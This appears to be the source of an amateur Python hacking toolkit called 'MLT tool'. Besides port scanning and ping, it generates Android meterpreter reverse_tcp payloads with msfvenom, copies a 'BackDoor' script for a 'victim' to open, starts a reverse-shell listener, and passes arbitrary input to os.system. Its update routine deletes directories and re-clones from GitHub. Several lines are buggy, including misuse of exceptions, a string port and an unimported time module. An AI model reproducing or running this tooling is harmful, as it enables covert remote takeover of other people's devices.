try:
   import os
   os.system('clear')
   from time import sleep
   yellow='\033[0;33m'
   a=yellow+''' 
                                                                         _______ 
   |-----------------Welcome-to---$---MLT-tool.py--------------------------|___M___|--------------------/
   |1:ping ip address          |12:classic Background                      |___L___|-------------------/
   |2:get ip for DNS           |                                           |___T___|------------------/                  
   |3:ip auto ports scanner    |                                           |___ ___|-----------------/
   |4:ip manual port scanner   |                                           |___T___|----------------/                  
   |5:get service for any port |                                           |___O___|---------------/              
   |6:ifconfig                 |                                           |___O___|--------------/
   |7:Create an android Payload|                                           |___L___|-------------/
   |8:Metasploit               |                                           |___ ___|------------/
   |9:generate a BackDoor      |                                           |___P___|-----------/
   |10:start reverse BackDoor  |                                           |___Y___|----------/
   |11:Fix & Update MLT tool   |                                           |___ ___|---------/
   \___________________________|___________________________________________|___ ___|--------/
                               |99: exit  |Warning! : You should run this tool in its Directory:(MLT-tool).
                               |100: menu |
                               |__________|
   Tool coded by MLT
   last update: v_1.2:

   Bug fixes
   system command is available to execut without exiting tool (ls,pwd......)
   '''
   green='\033[0;32m'
   print (a)
   print (green)
   import sys
   import socket
   print ('_________')
   print ('MLT Tool')
   print ('_________')
   def t1(ifoga):
       print ('')
       uinput=input('MLT~#> ')
       if uinput== '1' :
          makeinp=input('Ping---> ')
          os.system('ping '+makeinp)
       elif uinput== '2' :
          try:
             print (socket.gethostbyname(input('DNS--->: ')))
          except socket.error():
             print ('Error please Check your connection or your input')
       elif uinput== '3' :
          mkinput=input('6000 Port-Scanner---ip: ')
          for port in range (1,6000):
              sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
              try:
                 result=sock.connect_ex((mkinput,port))
                 if result==0:
                    print ('Port %s is open'%port)
                 else:
                    print ('Port %s is close'%port)
              except socket.error():
                 print ('Error: Your input not found to scan') 
       elif uinput== '4':
          jinput=input('manual p-s------ip--->: ') 
          pinput=input('manual p-s------port--->: ')
          s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
          if s.connect_ex((jinput,pinput))==0:
             print ('Port %s is open'%pinput)
          else:
             print ('Port %s is close'%pinput)
       elif uinput== '5' :
          portse=input('Serv-b-p port--->: ')
          try:
             print (socket.getservbyport(portse))
          except socket.gaierror():
             print ('No service for port %s'%portse)
       elif uinput== '6' :
          os.system('ifconfig')
       elif uinput=='99':
          os.system('clear')
          exit()
       elif uinput== '7':
          lhost=input('IP: ')
          lport=input('Port: ')
          lname=input(' Payload name [?](.apk): ')
          os.system('msfvenom -p android/meterpreter/reverse_tcp LHOST=%s LPORT=%s R> /root/Desktop/%s.apk'%(lhost,lport,lname))
          print ('PayLoad generated, Run metasploit and exploit')
       elif uinput=='100':
          c='\033[0;34m'
          d='\033[0;31m'
          print (c+a)
          print(d)
       elif uinput=='8':
          os.system('msfconsole')
       elif uinput=='9':
          os.chdir('MLT-home')
          name=input('Enter the name of the generated BackDoor (.py): ')
          os.system('cp vct.py %s'%name)
          os.system('mv %s /root/Desktop/'%name)
          print ('Generated (in /root/Desktop)')
          print ('Now run rmt.py with Python3 and wait victim to open the BackDoor with Python3')
       elif uinput=='10':
          os.system('cd MLT-home && python3 rmt.py')
       elif uinput=='11':
          os.system('clear')
          print ('Checking for new updates......')
          time.sleep(1)
          os.system('apt update&&apt upgrade&&cd ..&&cd ..&&rm -r MLT && git clone https://www.github.com/Mahmoud7Osman/MLT&&cd MLT/MLT-tool&&python3 MLT_tool.py')
       elif uinput=='12':
          while 1:
            for x in range (0,10101119281121):
                print ('Security attacks = %s ,DDos attacks = %s Welcome to hackers school'%(x,x))
       else:
          print ('<!=INT> EXECUTING %s'%uinput)
          print ('')
          os.system(uinput)
       return t1('')
   t1('')
except KeyboardInterrupt():
   print ('*Leaving MLT-Tool...*')
except socket.error():
   print ('Error: Unknown Error')
except socket.gaierror():
   print ('Error: Unknown Gai_Error')
